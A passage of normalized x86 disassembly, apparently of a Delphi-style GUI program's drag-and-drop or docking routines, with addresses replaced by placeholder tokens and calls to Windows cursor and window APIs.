add esp 0x100
pop esi
pop ebx
retn
sub_430dd8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_430ea2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_431ef8
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_431880
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ ebx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_4067b8
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_431880
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebx + 0xc ] 0x1
xor eax eax
call sub_431ef8
jmp r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_431880
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_431ef8
jmp r-xdata
sub eax 0x3
je r-xdata
jmp r-xdata
sub_430ea7
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_453380
call sub_4038e0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_431ef8
sub_430f00
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_430f2a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_430f90
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_430d3c
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
sub_430fbc
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffdd
call sub_4032ec
pop edi
pop esi
pop ecx
pop ebp
retn 0x4
sub_430fe8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x38 ]
mov si 0xffdf
call sub_4032ec
xor edx edx
sub_431040
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_43bc2c
sub_431060
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_43bc14
sub_431084
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_430f6c
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d17c
mov esi eax
mov [ ebx + 0x40 ] esi
mov edx 0xffffff
xor eax eax
call sub_4222c0
mov edx eax
mov eax esi
call sub_41d2f8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_4310e8
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_4030f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_431118
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_430f90
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x54 ]
mov [ ebx + 0x54 ] dl
mov edx [ eax + 0x58 ]
mov [ ebx + 0x58 ] edx
mov dl [ eax + 0x6c ]
mov [ ebx + 0x6c ] dl
push esi
lea esi [ eax + 0x44 ]
lea edi [ ebx + 0x44 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x5c ]
lea edi [ ebx + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_431174
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffe5
call sub_4032ec
pop edi
pop esi
pop ebp
retn 0x4
sub_431198
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_4311bc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_431198
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_431198
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
neg eax
push eax
neg esi
push esi
lea eax [ ebx + 0x44 ]
push eax
call OffsetRect
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_431278
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi ebx
cmp esi [ edi + 0x4 ]
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
cmp esi [ edx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
push [ edi + 0x10 ]
push [ edi + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ edx ]
jne r-xdata
xor eax eax
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov [ edi + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor ecx ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
sub_4312e4
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
call sub_431734
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x4
push esi
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x30 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_430850
mov esi eax
test esi esi
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov esi eax
mov eax esi
call sub_43a170
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov esi eax
mov eax esi
call sub_43a170
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_43a170
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax ebx
mov si 0xffbd
call sub_4032ec
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x9 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x5 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_431278
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi eax
mov eax esi
call sub_43a170
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0xa0 ]
call sub_43a170
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_43147c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_43a170
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_43a170
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_4314c0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xb4 ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_430cd8
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_4312e4
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_413860
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_43a170
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_43147c
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xa0 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbd
call sub_4032ec
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_438ca0
dec eax
jle r-xdata
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea eax [ ebp - 0x28 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_430c48
sub_43161c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edi esi
mov edx edi
mov eax [ rw-data ]
call sub_4138bc
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_413750
mov edx edi
mov eax [ rw-data ]
call sub_413704
jmp r-xdata
sub_43167c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call SendMessageA
mov ecx eax
sub_4316d4
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_40436c
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_43081c
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropA
test eax eax
setne bl
jmp r-xdata
sub_431734
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_4316d4
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_431760
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_4314c0
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_431734
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_43167c
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_43a170
mov [ esi ] eax
sub_4317b0
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0xc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov ecx [ rw-data ]
mov edx ebx
call sub_43167c
cmp eax 0x1
sbb eax eax
inc eax
sub_4317ec
push ebx
push esi
push edi
xor edi edi
mov eax [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
cmp [ esi + 0x178 ] 0x0
je r-xdata
mov eax esi
call sub_438c0c
test eax eax
je r-xdata
mov eax esi
call sub_438c0c
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0xc
xor edx edx
call sub_43221c
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x178 ]
call sub_413860
mov edx [ rw-data ]
cmp eax [ edx + 0x38 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_4138bc
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
mov edx eax
mov eax esi
call sub_438c20
mov edi eax
jmp r-xdata
sub_431880
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
mov cl [ eax + 0x9b ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_431760
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ edi ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x9b ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_43bae8
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al 0x1
call sub_4317b0
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov eax [ edi + 0x4 ]
push eax
mov al 0x2
call sub_4317b0
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
call sub_4334b4
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
xor eax eax
call sub_4317b0
cmp [ rw-data ] 0x0
je r-xdata
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4512e8
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_43bad0
mov eax [ rw-data ]
cmp [ eax + 0x6a ] 0x0
jne r-xdata
test [ ebx + 0x51 ] 0x20
je r-xdata
call sub_4317ec
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x58 ] ebx
test ebx ebx
jne r-xdata
mov edx [ edi + 0x4 ]
push edx
mov ecx [ edi ]
mov eax [ rw-data ]
mov edx [ eax + 0x38 ]
xchg edx eax
mov si 0xffe7
call sub_4032ec
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ rw-data ]
call sub_43bbd0
jmp r-xdata
mov eax [ edi + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
call sub_43bae8
jmp r-xdata
mov eax [ rw-data ]
call sub_43bc44
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4512e8
push eax
call SetCursor
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebx
call sub_4334b4
lea edx [ esp + 0x8 ]
mov eax ebx
mov si 0xffd8
call sub_4032ec
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
mov eax [ rw-data ]
lea edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov si 0xffd8
call sub_4032ec
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ rw-data ]
lea edx [ ebx + 0x5c ]
lea eax [ ebx + 0x44 ]
mov ecx 0x10
call sub_407a3c
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_431b50
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x4 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_430d7c
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x44 ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x20 ] ecx
mov [ edx + 0x24 ] ecx
mov edi [ edx + 0xc ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x20 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c0
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_43bae8
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov ecx esi
mov edi [ ecx + 0x10 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x28 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_431880
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_431cc0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push sub_431e65
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x9b ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe3
call sub_4032ec
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdc
call sub_4032ec
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_431084
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_431b50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_430f6c
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x44
push eax
mov eax esi
call sub_43a170
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_412404
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_433488
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x48 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x48 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x48 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x38 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x44 ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_412404
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
sub_431e84
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
mov ecx [ rw-data ]
mov si 0xffbe
call sub_4032ec
mov ebx eax
sub_431ef8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x2 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
